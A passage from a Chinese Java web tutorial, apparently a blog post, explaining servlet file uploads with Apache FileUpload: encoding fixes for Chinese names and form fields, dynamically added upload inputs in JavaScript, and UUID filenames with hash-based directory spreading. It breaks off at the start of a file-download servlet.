&lt;ul&gt;&lt;li&gt;&lt;strong&gt;我把文件名改成中文，就乱码了&lt;/strong&gt;：&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20170327132619813?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9uXzN5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;这里写图片描述&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;表单提交过来的中文数据也乱码了&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20170327132752164?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9uXzN5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;这里写图片描述&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上面已经说了，上传文件的数据的&lt;strong&gt;表单进行了二进制封装&lt;/strong&gt;，所以&lt;strong&gt;使用request对数据编码编码，对于表单提交过来的数据是不奏效的！&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;fileupload解决乱码&quot;&gt;FileUpload解决乱码&lt;/h2&gt;
&lt;p&gt;使用FileUpload解决乱码问题是十分简单的&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;解决中文文件名乱码，得到解析器以后，&lt;strong&gt;就直接设置解析器的编码为UTF-8就行了！&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

        &lt;span class=&quot;co&quot;&gt;//设置upload的编码&lt;/span&gt;
        fileUpload.&lt;span class=&quot;fu&quot;&gt;setHeaderEncoding&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;);&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;解决表单数据乱码，&lt;strong&gt;在获取表单值的时候，按照UTF-8编码来获取&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
   String value = fileItem.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;);&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;效果&quot;&gt;&lt;strong&gt;效果：&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20170327162516674?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9uXzN5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;这里写图片描述&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;smartupload解决乱码&quot;&gt;&lt;strong&gt;SmartUpload解决乱码&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;这个组件解决乱码问题有点麻烦，在网上找了各种办法也没找到简单的......&lt;/p&gt;
&lt;p&gt;所以，&lt;strong&gt;如果数据不涉及到中文就使用SmartUpload组件，涉及到中文数据就使用FileUpload组件吧！&lt;/strong&gt;&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;假设我现在有多个文件要上传，而且要&lt;strong&gt;上传的个数是不确定的&lt;/strong&gt;。那么我们要怎么办呢？？？&lt;/p&gt;
&lt;p&gt;我们不可能列出很多很多个上传文件的控件在页面上，这样不美观。如果用户用不到那么多个控件，也浪费呀。&lt;/p&gt;
&lt;p&gt;所以，我们想要动态地增添上传文件的控件，&lt;strong&gt;如果用户还想要上传文件，只需要动态地生成控件出来即可！&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;分析&quot;&gt;分析&lt;/h2&gt;
&lt;p&gt;要想在页面上动态地生成控件，无非就是使用JavaScript代码。&lt;/p&gt;
&lt;p&gt;那么我们要怎么做呢？？&lt;/p&gt;
&lt;p&gt;这样子吧：&lt;strong&gt;当用户想要上传文件的时候，就点击按钮，按钮绑定事件，生成文件上传的控件&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;为了做得更加完善，&lt;strong&gt;每当生成了文件上传的控件，也提供一个删除按钮，删除该控件！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们&lt;strong&gt;应该使用div装载着我们要生成的控件和删除按钮，而用户点击删除的时候，应该是要把删除按钮和文件上传控件都一起隐藏起来的&lt;/strong&gt;。所以，最好就是使用&lt;strong&gt;嵌套div&lt;/strong&gt;！&lt;/p&gt;
&lt;h2 id=&quot;代码&quot;&gt;代码&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;页面代码：&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;

&lt;span class=&quot;kw&quot;&gt;&amp;lt;table&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; border=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;1px&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;kw&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;上传用户：&lt;span class=&quot;kw&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; type=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;text&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;kw&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;添加上传文件&lt;span class=&quot;kw&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; type=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;button&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; value=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;添加上传文件&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; onclick=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;addUploadFile()&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;kw&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;

        &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;div&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; id=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;

&lt;span class=&quot;kw&quot;&gt;&amp;lt;/table&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;javaScript代码&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;
    &lt;span class=&quot;op&quot;&gt;&amp;lt;&lt;/span&gt;script type&lt;span class=&quot;op&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt;

        &lt;span class=&quot;kw&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;at&quot;&gt;addUploadFile&lt;/span&gt;() &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;

            &lt;span class=&quot;co&quot;&gt;//生成文件上传控件&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; input &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;createElement&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;input&quot;&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;va&quot;&gt;input&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'file'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;va&quot;&gt;input&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'fileName'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;


            &lt;span class=&quot;co&quot;&gt;//生成删除按钮&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; del &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;createElement&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;input&quot;&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;va&quot;&gt;del&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'button'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;va&quot;&gt;del&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'删除'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;co&quot;&gt;//生成内部的div&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; innerDiv &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;createElement&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;div&quot;&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;co&quot;&gt;//将两个控件绑定到内部div上&lt;/span&gt;
            &lt;span class=&quot;va&quot;&gt;innerDiv&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;appendChild&lt;/span&gt;(input)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;va&quot;&gt;innerDiv&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;appendChild&lt;/span&gt;(del)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;co&quot;&gt;//得到外部div控件，并将内部div绑定到外部div上&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; outterDiv &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;getElementById&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;file&quot;&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;va&quot;&gt;outterDiv&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;appendChild&lt;/span&gt;(innerDiv)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;co&quot;&gt;//为删除按钮绑定事件&lt;/span&gt;
            &lt;span class=&quot;va&quot;&gt;del&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;onclick&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;at&quot;&gt;dele&lt;/span&gt;() &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;

                &lt;span class=&quot;co&quot;&gt;//调用外界div的remove方法把内部的div干掉&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;va&quot;&gt;parentNode&lt;/span&gt;.&lt;span class=&quot;va&quot;&gt;parentNode&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;removeChild&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;parentNode&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;op&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;hr/&gt;
&lt;ul&gt;&lt;li&gt;如果&lt;strong&gt;上传文件的大小大于我们设定文件的大小&lt;/strong&gt;，那么文件在&lt;strong&gt;上传的时候会使用临时文件保存上传数据&lt;/strong&gt;。在上传完毕后，我们&lt;strong&gt;应该删除临时文件&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;上传文件的位置是不能在WEB服务器管理之下的，否则可能造成安全问题【其他人有可能通过手段来修改上传文件】&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;如果上传文件名相同，那么就会把原本的上传文件覆盖掉&lt;/strong&gt;。我们要生成一个独一无二的文件名。&lt;/li&gt;
&lt;li&gt;如果用户量很大，上传文件非常多。那么我们&lt;strong&gt;不应该在一个目录保存所有的上传文件，这样很可能造成磁盘奔溃了&lt;/strong&gt;。所以我们要&lt;strong&gt;把上传的文件打散到不同的目录下&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;分析-1&quot;&gt;分析&lt;/h2&gt;
&lt;p&gt;删除临时文件问题是非常简单的，只需要&lt;strong&gt;在所有的操作完毕之后，调用FileItem的delete()方法即可&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;让上传文件的位置不能在WEB服务器管理之下，我们&lt;strong&gt;把上传文件的位置放到WEB-INF/目录下即可！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;文件名相同的问题，我们可以&lt;strong&gt;使用UUID+用户上传的文件名来作为我们保存上传文件名&lt;/strong&gt;。这样的文件名就是独一无二的了。&lt;/p&gt;
&lt;p&gt;要将上传的文件进行打散，那么我们需要&lt;strong&gt;使用HashCode算法来进行打散&lt;/strong&gt;。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;低四位生成一级目录&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;5-8位生成二级目录&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;代码-1&quot;&gt;代码&lt;/h2&gt;
&lt;p&gt;下面我们写一个比较完善的上传文件代码&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;使用hashCode算法来打散保存的目录&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String &lt;span class=&quot;fu&quot;&gt;makeDirPath&lt;/span&gt;(String fileName, String path) {

        &lt;span class=&quot;co&quot;&gt;//通过文件名来算出一级目录和二级目录&lt;/span&gt;
        &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; hashCode = fileName.&lt;span class=&quot;fu&quot;&gt;hashCode&lt;/span&gt;();
        &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; dir1 = hashCode &amp;amp; &lt;span class=&quot;bn&quot;&gt;0xf&lt;/span&gt;;
        &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; dir2 = (hashCode &amp;amp; &lt;span class=&quot;bn&quot;&gt;0xf0&lt;/span&gt;) &amp;gt;&amp;gt; &lt;span class=&quot;dv&quot;&gt;4&lt;/span&gt;;

        String dir = path + &lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt; + dir1 + &lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt; + dir2;

        &lt;span class=&quot;co&quot;&gt;//如果该目录不存在，就创建目录&lt;/span&gt;
        File file = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; File(dir);
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (!file.&lt;span class=&quot;fu&quot;&gt;exists&lt;/span&gt;()) {

            file.&lt;span class=&quot;fu&quot;&gt;mkdirs&lt;/span&gt;();
        }
        &lt;span class=&quot;co&quot;&gt;//返回全路径&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; dir;

    }
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;生成独一无二的文件名&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String &lt;span class=&quot;fu&quot;&gt;makeFileName&lt;/span&gt;(String fileName) {

        &lt;span class=&quot;co&quot;&gt;//使用下划线把UUID和文件名分割开来，后面可能会解析文件名的。&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; UUID.&lt;span class=&quot;fu&quot;&gt;randomUUID&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;toString&lt;/span&gt;() + &lt;span class=&quot;st&quot;&gt;&quot;_&quot;&lt;/span&gt;+ fileName;

    }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;上传的代码&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;13&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

        &lt;span class=&quot;co&quot;&gt;//创建工厂&lt;/span&gt;
        DiskFileItemFactory factory = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;DiskFileItemFactory&lt;/span&gt;();

        &lt;span class=&quot;co&quot;&gt;//通过工厂创建解析器&lt;/span&gt;
        ServletFileUpload fileUpload = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;ServletFileUpload&lt;/span&gt;(factory);

        &lt;span class=&quot;co&quot;&gt;//设置upload的编码&lt;/span&gt;
        fileUpload.&lt;span class=&quot;fu&quot;&gt;setHeaderEncoding&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;);

        &lt;span class=&quot;co&quot;&gt;//判断上传表单的类型&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt;(!fileUpload.&lt;span class=&quot;fu&quot;&gt;isMultipartContent&lt;/span&gt;(request)){
            &lt;span class=&quot;co&quot;&gt;//上传表单为普通表单，则按照传统方式获取数据即可&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt;;
        }

        &lt;span class=&quot;kw&quot;&gt;try&lt;/span&gt; {

            &lt;span class=&quot;co&quot;&gt;//解析request对象，得到List【装载着上传的全部内容】&lt;/span&gt;
            List&amp;lt;FileItem&amp;gt; list = fileUpload.&lt;span class=&quot;fu&quot;&gt;parseRequest&lt;/span&gt;(request);

            &lt;span class=&quot;co&quot;&gt;//遍历List，判断装载的内容是普通字段还是上传文件&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; (FileItem fileItem : list) {

                &lt;span class=&quot;co&quot;&gt;//如果是普通输入项&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (fileItem.&lt;span class=&quot;fu&quot;&gt;isFormField&lt;/span&gt;()) {

                    &lt;span class=&quot;co&quot;&gt;//得到输入项的名称和值&lt;/span&gt;
                    String name = fileItem.&lt;span class=&quot;fu&quot;&gt;getFieldName&lt;/span&gt;();
                    String value = fileItem.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;);

                    System.&lt;span class=&quot;fu&quot;&gt;out&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;println&lt;/span&gt;(name + &lt;span class=&quot;st&quot;&gt;&quot; = &quot;&lt;/span&gt; + value);
                } &lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt; {

                    &lt;span class=&quot;co&quot;&gt;//如果是上传文件&lt;/span&gt;

                    &lt;span class=&quot;co&quot;&gt;//得到上传名称【包括路径名】&lt;/span&gt;
                    String fileName = fileItem.&lt;span class=&quot;fu&quot;&gt;getName&lt;/span&gt;();

                    &lt;span class=&quot;co&quot;&gt;//截取文件名&lt;/span&gt;
                    fileName = fileName.&lt;span class=&quot;fu&quot;&gt;substring&lt;/span&gt;(fileName.&lt;span class=&quot;fu&quot;&gt;lastIndexOf&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;) + &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;);

                    &lt;span class=&quot;co&quot;&gt;//生成独一无二的文件名&lt;/span&gt;
                    fileName = &lt;span class=&quot;fu&quot;&gt;makeFileName&lt;/span&gt;(fileName);

                    InputStream inputStream = fileItem.&lt;span class=&quot;fu&quot;&gt;getInputStream&lt;/span&gt;();

                    &lt;span class=&quot;co&quot;&gt;//得到项目的路径，把上传文件写到项目中&lt;/span&gt;
                    String path = &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;getServletContext&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;getRealPath&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;/WEB-INF/uploadFile&quot;&lt;/span&gt;);

                    &lt;span class=&quot;co&quot;&gt;//得到分散后的目录路径&lt;/span&gt;
                    String realPath = &lt;span class=&quot;fu&quot;&gt;makeDirPath&lt;/span&gt;(fileName, path);

                    FileOutputStream outputStream = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; FileOutputStream(realPath + &lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt; + fileName);

                    &lt;span class=&quot;dt&quot;&gt;byte&lt;/span&gt;[] bytes = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;byte&lt;/span&gt;[&lt;span class=&quot;dv&quot;&gt;1024&lt;/span&gt;];
                    &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; len = &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;
                    &lt;span class=&quot;kw&quot;&gt;while&lt;/span&gt; ((len = inputStream.&lt;span class=&quot;fu&quot;&gt;read&lt;/span&gt;(bytes)) &amp;gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;) {
                        outputStream.&lt;span class=&quot;fu&quot;&gt;write&lt;/span&gt;(bytes, &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;, len);
                    }

                    inputStream.&lt;span class=&quot;fu&quot;&gt;close&lt;/span&gt;();
                    outputStream.&lt;span class=&quot;fu&quot;&gt;close&lt;/span&gt;();

                    &lt;span class=&quot;co&quot;&gt;//删除临时文件的数据&lt;/span&gt;
                    fileItem.&lt;span class=&quot;fu&quot;&gt;delete&lt;/span&gt;();

                }
            }

        } &lt;span class=&quot;kw&quot;&gt;catch&lt;/span&gt; (FileUploadException e) {
            e.&lt;span class=&quot;fu&quot;&gt;printStackTrace&lt;/span&gt;();
        }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;效果-1&quot;&gt;效果：&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;成功把目录打散，文件名也是独一无二的了。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20170327173915684?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9uXzN5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;这里写图片描述&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;在讲解respose对象的时候已经讲解过文件下载了。这次我们就直接写一个小案例来巩固文件下载把。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;上传目录下的文件有3个&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20170327183913502?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9uXzN5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;这里写图片描述&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;分析-2&quot;&gt;分析&lt;/h2&gt;
&lt;p&gt;首先，要把目录下的文件都列出来。由于后&lt;strong&gt;面要根据文件名对文件进行下载，所以我们用一个Map集合来保存所有的文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下载文件部分也很简单，&lt;strong&gt;根据文件名和上传文件位置找到对应的文件，对其进行读写，然后修改消息头实现下载就好了。&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;得到装载上传文件的路径，通过递归把所有的文件都查找出来（判断是否是文件就是递归出口），装载到Map集合中&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;将Map集合传到前台做展示&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用户点击下载的时候，再根据原名来获取绝对路径&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;如果该资源是存在的，就允许用户下载&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;代码-2&quot;&gt;代码&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;将存放在WEB-INF/目录下的文件全部放在Map集合中&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;18&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

    &lt;span class=&quot;kw&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;doPost&lt;/span&gt;(HttpServletRequest request, HttpServletResponse response) &lt;span class=&quot;kw&quot;&gt;throws&lt;/span&gt; ServletException, IOException {


        &lt;span class=&quot;co&quot;&gt;//得到上传文件的目录&lt;/span&gt;
